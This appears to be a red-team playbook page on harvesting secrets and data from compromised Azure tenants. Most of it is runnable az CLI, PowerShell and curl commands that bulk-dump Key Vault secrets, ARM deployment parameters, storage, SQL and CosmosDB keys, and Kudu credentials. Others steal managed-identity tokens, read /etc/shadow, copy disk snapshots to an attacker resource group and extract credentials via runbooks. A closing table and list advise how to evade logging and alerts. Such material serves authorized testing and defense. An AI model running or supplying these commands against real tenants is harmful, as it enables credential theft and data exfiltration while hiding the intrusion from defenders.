# Azure Data Mining

> **MITRE ATT&CK**: Collection > T1530 (Data from Cloud Storage), T1552.005 (Cloud Instance Metadata), T1213 (Data from Information Repositories)
> **Platforms**: Azure / Entra ID / Microsoft 365
> **Required Privileges**: Medium (varies by target resource)
> **OPSEC Risk**: Medium

## Strategic Overview

Azure data mining is the post-compromise extraction phase where enumerated access is converted into actionable intelligence and sensitive data. Unlike on-premises environments where data lives on file shares and databases, Azure distributes secrets across dozens of service types -- Key Vaults, ARM deployment templates, Storage Accounts, Automation Account variables, App Service configuration, Function App secrets, and VM metadata. The critical insight for a red team lead is that Azure's "infrastructure as code" approach means credentials and secrets are frequently embedded in deployment artifacts. ARM template parameters, Automation Account variables, and App Service connection strings often contain plaintext passwords and API keys that were set during deployment and never rotated. The mining methodology is systematic: enumerate accessible resources (via azure-enumeration.md techniques), then extract secrets from each resource type using the specific API paths documented below. Managed Identities are the key enabler -- a compromised VM or Function App with a Managed Identity often has access to Key Vault secrets, Storage Account data, and SQL databases simultaneously.

## Technical Deep-Dive

### Key Vault Extraction

```bash
# List accessible Key Vaults
az keyvault list --query "[].{Name:name,RG:resourceGroup,Location:location}" -o table

# Key Vault access requires BOTH:
# 1. Data plane permission (Access Policy or RBAC: Key Vault Secrets User/Officer)
# 2. Network access (check firewall rules)

# Check Key Vault access model (access policy vs RBAC)
az keyvault show --name target-vault --query "properties.enableRbacAuthorization"

# Enumerate all secrets (names and metadata)
az keyvault secret list --vault-name target-vault \
  --query "[].{Name:name,Enabled:attributes.enabled,Created:attributes.created,Expires:attributes.expires}" -o table

# Extract secret values
az keyvault secret show --vault-name target-vault --name admin-password --query value -o tsv

# Bulk extract all secrets
for secret in $(az keyvault secret list --vault-name target-vault --query "[].name" -o tsv); do
    echo "=== $secret ==="
    az keyvault secret show --vault-name target-vault --name "$secret" --query value -o tsv
done

# Extract certificates (including private keys if exportable)
az keyvault certificate list --vault-name target-vault --query "[].{Name:name,Thumbprint:x509ThumbprintHex}" -o table
az keyvault secret show --vault-name target-vault --name cert-name --query value -o tsv
# Certificates stored as secrets contain the PFX/PEM with private key

# Extract cryptographic keys (metadata only -- key material not directly exportable for HSM-backed)
az keyvault key list --vault-name target-vault --query "[].{Name:name,KeyType:keyType,KeySize:keySize}" -o table

# Network restriction bypass via Managed Identity
# If on a VM in an allowed VNet/subnet, the MI can bypass Key Vault firewall rules
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | jq -r '.access_token'
# Use token directly with Key Vault REST API from within the VNet
```

### ARM Deployment Template Secrets

```bash
# ARM deployments frequently contain cleartext credentials in parameters/outputs
# Deployment history is retained by default and queryable

# List deployments in a resource group
az deployment group list --resource-group target-rg \
  --query "[].{Name:name,Timestamp:properties.timestamp,State:properties.provisioningState}" -o table

# Extract deployment template and parameters (may contain passwords)
az deployment group show --resource-group target-rg --name deployment-name \
  --query properties.parameters

# Bulk extract all deployment parameters across resource groups
for rg in $(az group list --query "[].name" -o tsv); do
    echo "=== Resource Group: $rg ==="
    for dep in $(az deployment group list --resource-group "$rg" --query "[].name" -o tsv 2>/dev/null); do
        echo "--- Deployment: $dep ---"
        az deployment group show --resource-group "$rg" --name "$dep" \
          --query "properties.parameters" -o json 2>/dev/null
    done
done

# Subscription-level deployments
az deployment sub list --query "[].{Name:name,Timestamp:properties.timestamp}" -o table
az deployment sub show --name deployment-name --query properties.parameters

# Look for common secret patterns in parameters:
# - adminPassword, sqlAdminPassword, vmAdminPassword
# - connectionString, storageAccountKey, instrumentationKey
# - clientSecret, certificatePassword, sshPublicKey

# Export the full template (useful for understanding infrastructure)
az deployment group export --resource-group target-rg --name deployment-name
```

```powershell
# PowerShell -- Get-AzResourceGroupDeployment for deeper inspection
$deployments = Get-AzResourceGroupDeployment -ResourceGroupName "target-rg"
foreach ($dep in $deployments) {
    Write-Output "Deployment: $($dep.DeploymentName)"
    $dep.Parameters | ConvertTo-Json -Depth 10
    # SecureString parameters show as null -- but non-secure parameters may contain secrets
}

# MicroBurst -- automated secret extraction
Import-Module MicroBurst.psm1
Get-AzPasswords  # Extracts passwords from various Azure sources
# Checks: Automation credentials, deployment parameters, app settings, etc.
```

### Storage Account Exploitation

```bash
# List accessible storage accounts
az storage account list --query "[].{Name:name,RG:resourceGroup,Kind:kind,Access:allowBlobPublicAccess}" -o table

# Get storage account keys (equivalent to root access on the account)
az storage account keys list --account-name targetstore --query "[].{Key:keyName,Value:value}" -o table

# Generate SAS token (time-limited access -- less suspicious than using account keys)
az storage account generate-sas --account-name targetstore \
  --services bfqt --resource-types sco --permissions rwdlacup \
  --expiry $(date -u -d "+1 hour" '+%Y-%m-%dT%H:%MZ') -o tsv

# Enumerate blob containers
az storage container list --account-name targetstore --account-key KEY \
  --query "[].{Name:name,Access:properties.publicAccess}" -o table

# List blobs in a container
az storage blob list --account-name targetstore --container-name data \
  --account-key KEY --query "[].{Name:name,Size:properties.contentLength}" -o table

# Download interesting blobs
az storage blob download --account-name targetstore --container-name backups \
  --name database-backup.sql --file ./database-backup.sql --account-key KEY

# Check for anonymous access (no auth required)
curl -s "https://targetstore.blob.core.windows.net/public-container?restype=container&comp=list"

# Enumerate table storage (often contains logs, config, session data)
az storage table list --account-name targetstore --account-key KEY
az storage entity query --table-name ConfigTable --account-name targetstore --account-key KEY

# Enumerate file shares (SMB -- may contain sensitive files)
az storage share list --account-name targetstore --account-key KEY
az storage file list --share-name fileshare --account-name targetstore --account-key KEY

# Queue messages (may contain commands, events, or secrets)
az storage message peek --queue-name taskqueue --account-name targetstore --account-key KEY

# Cross-tenant storage access via SAS token abuse
# SAS tokens can be generated with long expiry and shared externally
# They survive key rotation if the SAS was signed before rotation
```

### Azure SQL & CosmosDB

```bash
# Enumerate SQL servers
az sql server list --query "[].{Name:name,Admin:administratorLogin,RG:resourceGroup,FQDN:fullyQualifiedDomainName}" -o table

# Check firewall rules (0.0.0.0 = "Allow Azure services" = any Azure IP)
az sql server firewall-rule list --server targetserver --resource-group target-rg \
  --query "[].{Name:name,Start:startIpAddress,End:endIpAddress}" -o table

# List databases
az sql db list --server targetserver --resource-group target-rg \
  --query "[].{Name:name,Status:status,MaxSize:maxSizeBytes}" -o table

# Connection string extraction from App Service (if you have access)
az webapp config connection-string list --name targetapp --resource-group target-rg
# Returns SQL connection strings with embedded credentials

# Access SQL via Managed Identity token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/" \
  | jq -r '.access_token')
# Use token in SQL connection: Server=tcp:target.database.windows.net;Authentication=Active Directory Managed Identity

# CosmosDB key extraction
az cosmosdb keys list --name targetcosmos --resource-group target-rg
# Returns primary/secondary read-write and read-only keys
# These keys provide FULL access to all databases and containers

# CosmosDB connection string
az cosmosdb keys list --name targetcosmos --resource-group target-rg --type connection-strings
```

### Azure Resource Graph for Data Discovery

```bash
# Find all storage accounts with public blob access enabled
az graph query -q "Resources
  | where type == 'microsoft.storage/storageaccounts'
  | where properties.allowBlobPublicAccess == true
  | project name, resourceGroup, subscriptionId"

# Find SQL servers with overly permissive firewall rules
az graph query -q "Resources
  | where type == 'microsoft.sql/servers/firewallrules'
  | where properties.startIpAddress == '0.0.0.0'
  | project name, resourceGroup"

# Find Key Vaults across all subscriptions
az graph query -q "Resources
  | where type == 'microsoft.keyvault/vaults'
  | project name, resourceGroup, subscriptionId, properties.enableSoftDelete"

# Find VMs with managed identities (data access pivots)
az graph query -q "Resources
  | where type == 'microsoft.compute/virtualmachines'
  | where isnotnull(identity)
  | project name, resourceGroup, identity.type, identity.userAssignedIdentities"

# Find Automation Accounts (credential stores)
az graph query -q "Resources
  | where type == 'microsoft.automation/automationaccounts'
  | project name, resourceGroup, subscriptionId"

# Find App Services with connection strings
az graph query -q "Resources
  | where type == 'microsoft.web/sites'
  | project name, resourceGroup, kind, properties.defaultHostName"
```

### Automation Account Variables & Credentials

```powershell
# Automation Accounts store credentials and variables
# Run As accounts (classic) and Managed Identities provide execution context

# List Automation Account variables
az automation variable list --automation-account-name target-auto \
  --resource-group target-rg --query "[].{Name:name,Encrypted:isEncrypted,Value:value}" -o table
# Unencrypted variables return values directly
# Encrypted variables require execution context to decrypt

# List stored credentials
az rest --method GET --uri "/subscriptions/SUB_ID/resourceGroups/target-rg/providers/Microsoft.Automation/automationAccounts/target-auto/credentials?api-version=2023-11-01"

# Extract encrypted variables via Runbook execution
# Create a Runbook that reads and exfiltrates encrypted variables
$runbookCode = @'
$secret = Get-AutomationVariable -Name "AdminPassword"
$cred = Get-AutomationPSCredential -Name "DomainAdmin"
$output = @{
    AdminPassword = $secret
    DomainAdmin_User = $cred.UserName
    DomainAdmin_Pass = $cred.GetNetworkCredential().Password
}
$output | ConvertTo-Json
'@

# Certificates stored in Automation Accounts
Get-AzAutomationCertificate -AutomationAccountName "target-auto" -ResourceGroupName "target-rg"

# Connection objects (may contain SQL, Azure, or custom connection strings)
Get-AzAutomationConnection -AutomationAccountName "target-auto" -ResourceGroupName "target-rg"
```

### App Service Configuration

```bash
# Application settings (environment variables -- often contain secrets)
az webapp config appsettings list --name targetapp --resource-group target-rg
# Common secrets found: API keys, connection strings, storage keys, SMTP passwords

# Connection strings (separate from app settings)
az webapp config connection-string list --name targetapp --resource-group target-rg

# Managed Identity token from App Service
# If you have code execution on the App Service:
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"

# SCM/Kudu access (deployment endpoint)
# https://targetapp.scm.azurewebsites.net
# If accessible, provides: file browser, process explorer, environment variables, logs
az webapp deployment list-publishing-profiles --name targetapp --resource-group target-rg
# Returns FTP credentials and deployment passwords

# Download app content via Kudu ZIP API
curl -u '$targetapp:<password>' https://targetapp.scm.azurewebsites.net/api/zip/site/wwwroot/ -o app.zip

# Deployment slots (may have different configuration with test credentials)
az webapp deployment slot list --name targetapp --resource-group target-rg
az webapp config appsettings list --name targetapp --resource-group target-rg --slot staging
```

### Function App Secrets

```bash
# Function App host keys and function keys
az functionapp keys list --name targetfunc --resource-group target-rg
# Host keys: _master (full admin), default (invoke any function)
# Function keys: per-function invocation keys

# Function App application settings
az functionapp config appsettings list --name targetfunc --resource-group target-rg
# Common secrets: AzureWebJobsStorage (storage connection string),
# FUNCTIONS_WORKER_RUNTIME, custom API keys, database connections

# Managed Identity token from Function App
# Same endpoint as App Service:
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://vault.azure.net"

# Function App source code (if deployment artifacts are accessible)
az functionapp deployment source show --name targetfunc --resource-group target-rg

# List individual functions and their bindings
az functionapp function list --name targetfunc --resource-group target-rg
az functionapp function show --name targetfunc --resource-group target-rg --function-name HttpTrigger1
# Function bindings may reference connection strings and queue endpoints
```

### Virtual Machine Data

```bash
# Custom Script Extension history (commands executed on VMs)
az vm extension list --vm-name targetvm --resource-group target-rg
az vm extension show --vm-name targetvm --resource-group target-rg --name CustomScriptExtension
# May contain: setup scripts, configuration commands, embedded credentials

# Run Command output (previously executed commands)
az vm run-command list --vm-name targetvm --resource-group target-rg

# Execute Run Command for data extraction (requires Contributor on VM)
az vm run-command invoke --resource-group target-rg --name targetvm \
  --command-id RunShellScript --scripts "cat /etc/shadow" "ls -la /home/"

# VM metadata (IMDS)
# From within the VM:
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .
# Returns: VM name, resource group, subscription, network config, tags
# Tags often contain environment info, cost centers, or project names

# Disk snapshots (access data without VM access)
az snapshot list --query "[].{Name:name,RG:resourceGroup,Source:creationData.sourceResourceId}" -o table
# Create a VM from a snapshot to access its data offline
az snapshot create --resource-group attacker-rg --name stolen-snap \
  --source "/subscriptions/SUB_ID/resourceGroups/target-rg/providers/Microsoft.Compute/disks/targetvm-osdisk"

# VM user data (cloud-init scripts -- may contain setup credentials)
az vm show --name targetvm --resource-group target-rg --query "userData" -o tsv | base64 -d

# Serial console output (boot diagnostics)
az vm boot-diagnostics get-boot-log --name targetvm --resource-group target-rg
```

### Logic App & Other Service Data

```bash
# Logic App workflow definitions (may contain inline credentials)
az logic workflow show --name target-logic-app --resource-group target-rg \
  --query "definition" -o json

# API Connection credentials (used by Logic Apps and Power Automate)
az resource list --resource-type Microsoft.Web/connections \
  --query "[].{Name:name,RG:resourceGroup,Type:kind}" -o table

# Data Factory linked services (connection strings to data sources)
az datafactory linked-service list --factory-name targetdf --resource-group target-rg

# Container Registry credentials
az acr credential show --name targetacr
# Returns admin username and passwords for pulling/pushing images

# Service Bus connection strings
az servicebus namespace authorization-rule keys list \
  --resource-group target-rg --namespace-name targetbus --name RootManageSharedAccessKey

# Event Hub connection strings
az eventhubs namespace authorization-rule keys list \
  --resource-group target-rg --namespace-name targethub --name RootManageSharedAccessKey
```

## Detection & Evasion

| Data Mining Activity | Detection Source | Key Log Event | Evasion Approach |
|---------------------|-----------------|---------------|-----------------|
| Key Vault secret read | Key Vault Diagnostic Logs | SecretGet, SecretList | Access from expected MI, during business hours |
| ARM deployment history | Azure Activity Log | deployments/read | Normal admin activity; low visibility |
| Storage account key list | Azure Activity Log | listKeys action | Use SAS tokens instead of account keys |
| Storage blob download | Storage Analytics Logs | GetBlob | Access from within same VNet |
| SQL connection | SQL Audit Logs | Login events | Use MI-based auth; avoid password logins |
| Automation variable read | Automation Logs | Variable Get events | Read via existing Runbook, not new one |
| App settings read | Azure Activity Log | config/list | Normal deployment pipeline activity |
| Function key listing | Function App Logs | Host key retrieval | Admin key reads are routine operations |
| VM Run Command | Azure Activity Log | RunCommand event | Use existing script names; match schedule |
| Resource Graph queries | Azure Activity Log | Resource Graph query | Common admin/governance activity |

### Minimizing Detection Footprint

```
# Priority: use Managed Identity paths over direct credential use
# MI token acquisition from IMDS is not logged at the resource level
# Only the subsequent API call is logged
#
# Avoid:
# - Generating new storage account keys (logged, may alert)
# - Creating new Automation Runbooks (visible in audit logs)
# - Downloading large volumes of blobs rapidly (storage analytics)
# - Using Run Command on many VMs sequentially (activity log pattern)
#
# Prefer:
# - Reading Key Vault secrets via existing MI (appears as app activity)
# - Querying deployment history (low-signal admin operation)
# - Using SAS tokens with short expiry (less traceable than keys)
# - Accessing App Service config via Kudu (less monitored than ARM API)
# - Single targeted Resource Graph queries (one log entry for many results)
```

## Cross-References

- [Azure Enumeration](azure-enumeration.md) -- Discover resources before mining
- [Azure Privilege Escalation](azure-privilege-escalation.md) -- Escalate to access protected resources
- [Azure AD / Entra ID Attacks](azure-ad-attacks.md) -- Token manipulation for accessing data plane
- [Azure Persistence](azure-persistence.md) -- Maintain access to data sources
- [Azure Defenses & Bypass](azure-defenses-bypass.md) -- Bypass network restrictions on Key Vaults and Storage
- [Cloud Lateral Movement](../../09-lateral-movement/cloud-lateral.md) -- Pivot to resources with data access
- [Cloud Discovery](../../08-discovery/cloud-discovery.md) -- Initial resource discovery patterns

## References

- https://github.com/NetSPI/MicroBurst
- https://github.com/hausec/PowerZure
- https://learn.microsoft.com/en-us/azure/key-vault/general/security-features
- https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview
- https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/deployment-history
- https://learn.microsoft.com/en-us/azure/automation/shared-resources/credentials
- https://learn.microsoft.com/en-us/azure/app-service/configure-common
- https://learn.microsoft.com/en-us/azure/governance/resource-graph/overview
- https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse
- https://hackingthe.cloud/azure/abusing-managed-identities/
